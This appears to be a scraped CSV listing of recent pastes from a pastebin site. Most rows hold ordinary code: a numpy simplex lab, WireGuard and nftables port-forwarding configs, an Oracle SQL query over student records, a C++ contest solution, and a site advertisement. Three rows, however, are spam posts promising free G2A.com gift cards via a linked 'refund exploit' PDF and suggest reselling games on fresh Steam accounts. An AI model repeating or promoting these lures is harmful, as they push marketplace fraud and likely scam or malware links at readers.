id,title,username,language,date,content
p8WxMjs1,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Monday 18th of March 2024 12:21:29 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
18 March 2024















































"
YtQ4ttXn,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Monday 18th of March 2024 12:13:11 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_602778.pdf

Working as of:
18 March 2024"
iYmveUnD,numpy lab(18/03/2024),brandblox,Python,Sunday 17th of March 2024 11:10:01 PM CDT,"#Assignment: Write a Python Program to solve Linear Programming Problem using
#Simplex Method
import numpy as np

def simplex_method(A, b, c):
    m, n = A.shape
    # Create the initial tableau
    tableau = np.hstack([A, np.eye(m), b.reshape(-1, 1)])
    tableau = np.vstack([tableau, np.concatenate([c, np.zeros(m + 1)])])
    
    while True:
        # Find the pivot column
        pivot_col = np.argmin(tableau[-1, :-1])
        
        # If all elements in the last row are non-negative, optimal solution found
        if np.all(tableau[-1, :-1] >= 0):
            break
        
        # Find the pivot row
        ratios = tableau[:-1, -1] / tableau[:-1, pivot_col]
        pivot_row = np.argmin(ratios)
        
        # Perform pivot operation
        tableau[pivot_row, :] /= tableau[pivot_row, pivot_col]
        
        for i in range(m + 1):
            if i != pivot_row:
                tableau[i, :] -= tableau[i, pivot_col] * tableau[pivot_row, :]
    
    return tableau[-1, -1], tableau[-1, :-1]

A = np.array([[2, 1], [1, 2]])
b = np.array([4, 3])
c = np.array([-3, -5])

optimal_value, optimal_solution = simplex_method(A, b, c)

print(""Optimal value:"", optimal_value)
print(""Optimal solution:"", optimal_solution)

#Output
Optimal value: 8.333333333333334
Optimal solution: [0.         0.         0.33333333 2.33333333]
"
E04Zx1pR,wg conf,pdxlimb,Lua,Sunday 17th of March 2024 11:09:10 PM CDT,"[Interface]
Address = 10.66.66.1/24
ListenPort = 50100
PrivateKey = <redacted>
# PostUp = ufw allow 80
# PostUp = ufw allow 443
# PostUp = ufw allow 25565
# PostUp = ufw route allow in on wg0 out on eth0
# PostUp = iptables -t nat -A PREROUTING -p tcp --dport 80 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:80
# PostUp = iptables -t nat -A PREROUTING -p tcp --dport 443 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:443
# PostUp = iptables -t nat -A PREROUTING -p tcp --dport 50200 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:25565
# PostUp = iptables -t nat -I POSTROUTING -o eth0 -j MASQUERADE
# PostUp = iptables -t nat -A POSTROUTING -o wg0 -j MASQUERADE
# PostDown = ufw delete allow 80
# PostDOwn = ufw delete allow 443
# PostDown = ufw delete allow 25565
# PostDown = ufw route delete allow in on wg0 out on eth0
# PostDown = iptables -t nat -D PREROUTING -p tcp --dport 80 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:80
# PostDown = iptables -t nat -D PREROUTING -p tcp --dport 443 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:443
# PostDown = iptables -t nat -D PREROUTING -p tcp --dport 50200 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:25565
# PostDown = iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE
# PostDown = iptables -t nat -D POSTROUTING -o wg0 -j MASQUERADE

[Peer]
PublicKey = <redacted>
AllowedIPs = 10.66.66.2/32
PersistentKeepalive = 25"
Bjir5UwS,Untitled,ma39isy,Oracle 8,Sunday 17th of March 2024 10:34:00 PM CDT,"SELECT
	DISTINCT
	S.*,
	SP.STUDYPROGRAMNAME,
	CELLPHONE,
	YAHOOMAIL,
	GMAIL,
	EMAIL,
	GPA,
	NILAID,
	NILAIE,
	CREDIT,
	CREDITNOTPASS,
	CREDITPASS,
	CASE
		WHEN CREDITPASS>0 THEN ROUND(MCREDITPASS / CREDITPASS, 2)
		ELSE 0
	END GPAPASS,
	CREDIT2
FROM
	(
	SELECT
		*
	FROM
		MASTERDATA.STUDENT S
	WHERE
		S.STUDYPROGRAMID IN (
		SELECT
			STUDYPROGRAMID
		FROM
			MASTERDATA.STUDYPROGRAM
		WHERE
			FACULTYID IN (
			SELECT
				FACULTYID
			FROM
				USEROFFACULTY
			WHERE
				USERID = '48379'))) S
LEFT JOIN MASTERDATA.STUDYPROGRAM SP ON
	(S.STUDYPROGRAMID = SP.STUDYPROGRAMID)
LEFT JOIN (
	SELECT
		STUDENTID,
		MAX (DECODE(INFOID, 22, VALUE)) CELLPHONE,
		MAX (DECODE(INFOID, 7, VALUE)) GMAIL,
		MAX (DECODE(INFOID, 8, VALUE)) YAHOOMAIL
	FROM
		MASTERDATA. ACCOUNT
	WHERE
		INFOID IN (7, 8, 22)
	GROUP BY
		STUDENTID) t1 ON
	(S.STUDENTID = t1.STUDENTID)
LEFT JOIN (
	SELECT
		USERNAME,
		EMAIL
	FROM
		FRAMEWORK1. USERS
	JOIN FRAMEWORK1.USERMAPPING
			USING (USERID)
	WHERE
		USERGROUPID = 12) t2 ON
	(S.STUDENTID = t2.USERNAME)
LEFT JOIN (
	SELECT
		studentid,
		PASS_CREDIT CREDIT,
		GPA,
		COUNT (DECODE(INDEXPOINT, 'D', 1)) NILAID,
		COUNT (DECODE(INDEXPOINT, 'E', 1)) NILAIE,
		SUM (DECODE(PASS_STATUS, 'Y', 0, CREDIT)) CREDITNOTPASS,
		SUM (DECODE(PASS_STATUS, 'Y', CREDIT, 0)) CREDITPASS,
		SUM (DECODE(PASS_STATUS, 'Y', CREDIT * INDEX_CONVERSION, 0)) MCREDITPASS
	FROM
		COMPLETECOURSEPOINT
	JOIN GPASTUDENT
			USING (STUDENTID)
	WHERE
		ACTIVESTATUS = 'Y'
		AND LATESTSTATUS = 'Y'
	GROUP BY
		(STUDENTID,
		PASS_CREDIT,
		GPA)) t3 ON
	(S.STUDENTID = t3.STUDENTID)
LEFT JOIN (
	SELECT
		STUDENTID,
		SUM(CREDIT) CREDIT2
	FROM
		VIEW_KSM
	WHERE
		1 = 1
		AND SCHOOLYEAR = '2324'
		AND SEMESTER = '2'
	GROUP BY
		STUDENTID) t4 ON
	(S.STUDENTID = t4.STUDENTID)
WHERE
	1 = 1
	AND S.STUDYPROGRAMID = '41'
	AND S.STUDENTTYPEID IN ('1', '8', '9', '10')
ORDER BY
	S.STUDENTID ASC"
0FGPZNWn,🤑 G2A.com Free Gift Card Guide Mar 2024 🤑,luckysw,GetText,Sunday 17th of March 2024 10:33:49 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
If you use this make sure to use the English version of G2A.com otherwise this will not work!
  
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view
 
Working as of:
18 March 2024"
Gy2u5fhy,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Sunday 17th of March 2024 10:25:40 PM CDT,"https://pastes.io - #1 Pastebin Alternative - its free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes.
Embed, download, print pastes
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature
Simple Ads by Google Adsense Few rather than Pastebin"
RXkx2rFP,old-wg,pdxlimb,Bash,Sunday 17th of March 2024 10:19:17 PM CDT,"# called via PostDown

ufw allow 22
ufw allow 80
ufw allow 443
ufw allow 25565
ufw route allow in on wg0 out on eth0
iptables -t nat -A PREROUTING -p tcp --dport 80 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:443
iptables -t nat -A PREROUTING -p tcp --dport 25565 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:25565
iptables -t nat -I POSTROUTING -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -o wg0 -j MASQUERADE"
hmSQ4LdF,new-wg,pdxlimb,Bash,Sunday 17th of March 2024 10:17:01 PM CDT,"echo '

flush ruleset

table ip wg {

    chain input {
        type filter hook input priority filter; policy drop;
        tcp dport 22 accept
        tcp dport 80 accept
        tcp dport 50100 accept
        tcp dport 25565 accept
    }

    chain postrouting {
        type nat hook postrouting priority srcnat; policy accept;
        oifname ""eth0"" masquerade
    }

    chain prerouting {
        type nat hook prerouting priority dstnat; policy accept;
        tcp dport 80 ct state new dnat to 10.66.66.2:80;
        tcp dport 443 ct state new dnat to 10.66.66.2:443;
        tcp dport 25565 ct state new dnat to 10.66.66.2:25565;
    }

    chain forward {
        type filter hook forward priority filter; policy drop;
        iifname ""wg0"" oifname ""eth0"" accept
        iifname ""eth0"" oifname ""wg0"" accept
    }
}

' | nft -f -; nft list ruleset"
qXAFYciC,ccf csp202312-1,deezykiki,C++,Sunday 17th of March 2024 10:15:40 PM CDT,"#include<iostream>
using namespace std;
int main()
{
	int n,m;
	cin>>n>>m;
	int a[12][1010];
	for(int l = 0;l < n;l++)
	{
		for(int r = 0;r < m;r++)
		{
			cin>>a[l][r];
		}
	}
	
	for(int b = 0;b < n;b++)
	{	
		int flag = -1;
		for(int l = 0;l < n;l++)
		{	
			if(l != b)
			{
				for(int r = 0;r < m;r++)
				{
					if(a[l][r] <= a[b][r]) break;
					else if(a[l][r] > a[b][r]&&r == m-1)
					{
						if(flag == -1) flag = l;
						else if(l < flag) flag = l;
					}
				}
			}
		}
		if(flag != -1) cout<<flag+1<<endl;
		else cout<<0<<endl;
	}
	return 0;
}"
